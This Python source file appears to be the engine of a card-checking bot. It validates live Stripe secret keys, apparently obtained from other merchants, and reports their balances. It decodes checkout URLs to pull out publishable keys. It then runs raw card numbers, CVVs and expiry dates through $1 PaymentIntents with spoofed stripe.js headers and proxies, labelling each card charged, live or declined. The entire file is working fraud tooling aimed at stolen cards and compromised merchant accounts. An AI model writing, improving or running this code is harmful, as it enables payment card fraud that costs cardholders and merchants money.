# SK-Based Gate Engine - Stripe Direct PaymentIntents ($1.00)
import aiohttp
import asyncio
import re
import json
import random
import uuid
import sys
import httpx
import base64

def derive_pk_or_acct(sk_key, pk_key=None):
    acct_id = None
    if pk_key and pk_key.startswith('pk_live_'):
        if '_' in pk_key:
            raw = pk_key.split('_')[-1]
            if len(raw) >= 17 and raw.startswith('51'):
                acct_id = 'acct_1' + raw[2:17]
            elif len(raw) >= 16:
                acct_id = 'acct_' + raw[:16]
        return pk_key, acct_id

    if not sk_key or not sk_key.startswith('sk_live_'):
        return pk_key, None

    raw_sk = sk_key.split('_')[-1]
    if len(raw_sk) >= 17 and raw_sk.startswith('51'):
        acct_id = 'acct_1' + raw_sk[2:17]
    elif len(raw_sk) >= 16:
        acct_id = 'acct_' + raw_sk[:16]
    
    derived_pk = pk_key or ('pk_live_' + raw_sk)
    return derived_pk, acct_id

async def extract_real_pk_from_sk(session, sk_key):
    headers = {'Authorization': f'Bearer {sk_key}'}
    data = {
        'payment_method_types[0]': 'card',
        'line_items[0][price_data][currency]': 'usd',
        'line_items[0][price_data][product_data][name]': 'Audit',
        'line_items[0][price_data][unit_amount]': '100',
        'line_items[0][quantity]': '1',
        'mode': 'payment',
        'success_url': 'https://example.com/success',
        'cancel_url': 'https://example.com/cancel',
    }
    try:
        resp = await session.post('https://api.stripe.com/v1/checkout/sessions', headers=headers, data=data)
        json_res = resp.json() if hasattr(resp, 'json') and callable(resp.json) else await resp.json()
        checkout_url = json_res.get('url', '')
        if '#' in checkout_url:
            url_part = checkout_url.split('#')[1]
            encoded_url = url_part.replace('%2B', '+').replace('%2F', '/')
            encoded_url += '=' * (len(encoded_url) % 4)
            decoded_bytes = base64.urlsafe_b64decode(encoded_url)
            decoded_url = decoded_bytes.decode('utf-8')
            key = 5
            binary_key = bin(key)[2:].zfill(8)
            plaintext = ''
            for i in range(len(decoded_url)):
                binary_char = bin(ord(decoded_url[i]))[2:].zfill(8)
                xor_result = ''
                for j in range(8):
                    xor_result += str(int(binary_char[j]) ^ int(binary_key[j]))
                plaintext += chr(int(xor_result, 2))
            if 'pk_live_' in plaintext:
                raw_pk = plaintext.split('pk_live_')[1].split('"')[0]
                return 'pk_live_' + raw_pk
    except Exception as e:
        print(f"extract_real_pk_from_sk error: {e}")
    return None

async def validate_stripe_sk(sk_key, pk_key=None):
    sk_key = sk_key.strip()
    if not sk_key.startswith('sk_live_'):
        return False, 'Invalid Key Format', None

    headers = {'Authorization': 'Bearer ' + sk_key, 'User-Agent': 'Mozilla/5.0'}

    try:
        async with httpx.AsyncClient(timeout=12.0) as session:
            real_pk = None
            if pk_key and pk_key.startswith('pk_live_') and pk_key.replace('pk_live_', '') != sk_key.replace('sk_live_', ''):
                real_pk = pk_key
            else:
                real_pk = await extract_real_pk_from_sk(session, sk_key)

            derived_pk, acct_id = derive_pk_or_acct(sk_key, real_pk)

            resp = await session.get('https://api.stripe.com/v1/balance', headers=headers)
            bal_json = resp.json()
            if resp.status_code == 200:
                acc_json = {}
                try:
                    acc_resp = await session.get('https://api.stripe.com/v1/account', headers=headers)
                    if acc_resp.status_code == 200:
                        acc_json = acc_resp.json()
                except Exception:
                    pass

                avail_list = bal_json.get('available', [{}])
                pend_list = bal_json.get('pending', [{}])
                
                avail_item = avail_list[0] if avail_list else {}
                pend_item = pend_list[0] if pend_list else {}

                currency = str(avail_item.get('currency', 'usd')).upper()
                avail_amt = float(avail_item.get('amount', 0)) / 100.0
                pend_amt = float(pend_item.get('amount', 0)) / 100.0

                acc_id = acc_json.get('id') or acct_id
                country = acc_json.get('country', 'US')
                
                info = {
                    'sk': sk_key,
                    'pk': derived_pk,
                    'account_id': acc_id,
                    'country': country,
                    'currency': currency,
                    'available': f'{avail_amt:.2f} {currency}',
                    'pending': f'{pend_amt:.2f} {currency}'
                }
                return True, 'LIVE & ACTIVE 🟢', info
            else:
                err_msg = (bal_json.get('error') or {}).get('message', 'Expired or Invalid SK Key')
                return False, 'DEAD 🔴 (' + err_msg + ')', None
    except Exception as e:
        return False, 'Error checking key: ' + str(e), None

async def skintoff_engine(session, cc, mm, yy, cvv, sk_key, pk_key):
    if not pk_key or not pk_key.startswith('pk_live_') or pk_key.replace('pk_live_', '') == sk_key.replace('sk_key_', '').replace('sk_live_', ''):
        extracted = await extract_real_pk_from_sk(session, sk_key)
        if extracted:
            pk_key = extracted

    dummy_pk, sk_acct_id = derive_pk_or_acct(sk_key, None)

    # Step 1: Create PaymentIntent with SK
    headers_pi = {'Authorization': f'Bearer {sk_key}'}
    data_pi = {'amount': 100, 'currency': 'usd'}
    
    try:
        r1 = await session.post('https://api.stripe.com/v1/payment_intents', headers=headers_pi, data=data_pi)
        try:
            pi_json = r1.json()
        except Exception:
            pi_json = {}
        client_secret = pi_json.get('client_secret')
        pi_id = pi_json.get('id')
    except Exception as e:
        return f'[Step 1 Error] {str(e)}'

    if not client_secret or not pi_id:
        err_msg = pi_json.get('error', {}).get('message', f'Failed to create PaymentIntent ({getattr(r1, "status_code", 400)})')
        return f'[Step 1 Error] {err_msg}'

    # Step 2: Confirm PaymentIntent via real PK + payment_user_agent
    headers_confirm = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    data_confirm = {
        'key': pk_key,
        'client_secret': client_secret,
        'payment_method_data[type]': 'card',
        'payment_method_data[card][number]': cc,
        'payment_method_data[card][cvc]': cvv,
        'payment_method_data[card][exp_month]': mm,
        'payment_method_data[card][exp_year]': yy,
        'payment_method_data[payment_user_agent]': 'stripe.js/064d3d4e55; stripe-js-v3/064d3d4e55; split-card-element',
        'expected_payment_method_type': 'card',
        'use_stripe_sdk': 'true',
    }
    if sk_acct_id:
        data_confirm['_stripe_account'] = sk_acct_id

    try:
        r2 = await session.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=headers_confirm, data=data_confirm)
        text = r2.text
        try:
            json_res = r2.json()
        except Exception:
            json_res = {}

        if 'requires_action' in text or 'requires_source_action' in text:
            return '3D Secure Required'
        if '"cvc_check": "pass"' in text or '"cvc_check":"pass"' in text:
            return 'CVV Live'
        if 'error' in text:
            err_obj = json_res.get('error', {}) if isinstance(json_res, dict) else {}
            if isinstance(err_obj, dict) and 'decline_code' in err_obj:
                return err_obj['decline_code'].replace('_', ' ').title()
            elif isinstance(err_obj, dict) and 'message' in err_obj:
                return err_obj['message']
            else:
                return 'Payment Declined'
        elif 'succeeded' in text or (isinstance(json_res, dict) and json_res.get('status') == 'succeeded') or 'success:true' in text:
            return 'Charged $1'
        else:
            return 'Unexpected response'
    except Exception as e:
        return f'[Step 2 Error] {str(e)}'

async def check_card_sk(cc, mm, yy, cvc, sk_key=None, pk_key=None, proxy_url=None, user_id=None):
    if not sk_key or not pk_key:
        if user_id:
            try:
                from extra_tools import get_user_sk
                sk_data = get_user_sk(user_id)
                if sk_data and isinstance(sk_data, dict):
                    sk_key = sk_key or sk_data.get('sk')
                    pk_key = pk_key or sk_data.get('pk')
            except Exception:
                pass

    if not sk_key:
        return False, 'NO KEYS ⚠️', 'Please add an active SK key using /sk command', ''

    derived_pk, acct_id = derive_pk_or_acct(sk_key, pk_key)

    try:
        try:
            async with httpx.AsyncClient(proxy=proxy_url if proxy_url else None, timeout=20.0) as session:
                res_str = await skintoff_engine(session, cc, mm, yy, cvc, sk_key=sk_key, pk_key=derived_pk)
        except Exception as pe:
            if 'socks' in str(pe).lower() or 'proxy' in str(pe).lower():
                async with httpx.AsyncClient(timeout=20.0) as session:
                    res_str = await skintoff_engine(session, cc, mm, yy, cvc, sk_key=sk_key, pk_key=derived_pk)
            else:
                raise pe

        res_lower = str(res_str).lower()
        if 'charged' in res_lower or 'succeeded' in res_lower:
            return True, 'Charged! 🟢', res_str, res_str
        elif 'cvv live' in res_lower or 'insufficient' in res_lower or 'approved' in res_lower:
            return True, 'Approved! ✅', res_str, res_str
        elif '3d secure' in res_lower:
            return True, 'Live! 🟡 (3DS)', res_str, res_str
        else:
            return False, 'Declined! ❌', res_str, res_str
    except Exception as e:
        return False, 'ERROR ⚠️', str(e), ''
